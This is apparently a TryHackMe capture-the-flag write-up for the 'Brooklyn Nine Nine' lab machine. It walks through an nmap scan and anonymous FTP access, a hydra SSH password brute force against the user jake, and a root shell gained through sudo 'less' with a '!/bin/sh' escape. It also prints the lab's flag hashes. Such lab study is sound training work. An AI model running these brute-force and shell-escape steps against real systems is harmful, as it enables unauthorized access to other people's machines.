# Brooklyn Nine Nine - THM

## Enumeration 

### Let's start with the nmap scan 
```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-21 02:34 IST
Nmap scan report for 10.10.139.54
Host is up (0.20s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.52.153
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.08 seconds

```

### Here we find that we can access ftp by anonymous login, and after loggin in we find a file note_to_jake.txt
```
└─$ ftp 10.10.139.54                            
Connected to 10.10.139.54.
220 (vsFTPd 3.0.3)
Name (10.10.139.54:sig): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.16 secs (0.7253 kB/s)
```
### File contains 
```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
### From here we get to know that there is user names jake 

### Now lets try to bruteforce the creds using hydra 
```
hydra -l jake -P /home/sig/Downloads/rockyou.txt ssh://10.10.139.54    
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-11-21 02:38:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.139.54:22/
[22][ssh] host: 10.10.139.54   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-11-21 02:39:27

```

### BOOOOOMMMMMMM!!!!!!!!!!! Here are the creds 
```
jake:987654321
```

### And here we got the initial foothold to the webserver 

### After some manual enumeration we find the user flag in "holt" directory 
```
jake@brookly_nine_nine:/home/holt$ ls
nano.save  user.txt

```

### And here we got our user flag i.e
```
jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

## Prev esc 

### By doing sudo -l we find we can run less as sudo for all users that will help us to get the root flag
```
jake@brookly_nine_nine:/home/holt$ sudo -l

Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less

```

### So by running sudo as root we can see the root flag i.e 
```
jake@brookly_nine_nine:/home/holt$ sudo less /root/root.txt

```

### From using the command we can see our root flag i.e 
```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```
### Or by using GTFO bins we find 
```


    sudo less /etc/profile
    !/bin/sh


```
### To get the root shell
```
# whoami
root
# cat root.txt
cat: root.txt: No such file or directory
# pwd  
/home/holt
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
# 

```
### And here we sucesssfully compromised with the machine

### It's and easy machine 
## <3 BY SIG WOTTS
                    
